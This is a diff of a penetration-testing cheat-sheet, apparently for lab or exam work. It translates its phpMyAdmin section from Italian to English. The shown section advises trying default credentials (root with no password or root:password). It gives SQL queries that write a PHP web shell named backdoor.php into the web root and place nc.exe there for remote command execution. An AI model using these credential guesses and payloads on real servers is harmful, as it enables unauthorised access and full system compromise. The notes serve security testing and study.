@@ -1582,10 +1582,12 @@ Drupalgeddon
 
 ## phpMyAdmin
 
-- Se presente, testare `root` senza password. Se non funziona, utilizzare root:password
-- Se si riesce a fare login, si pu`o fare RCE con la seguente query
+- Try `root` without password or `root:password`
+- If you can login, try this query for a RCE
+  ```
   SELECT "<?php echo system($_GET['cmd']); ?>" into outfile "/var/www/html/web/backdoor.php"
   SELECT LOAD_FILE('C:\\xampp\\htdocs\\nc.exe') INTO DUMPFILE 'C:\\xampp\\htdocs\\nc.exe';
+  ```
   
   
 ## PHP
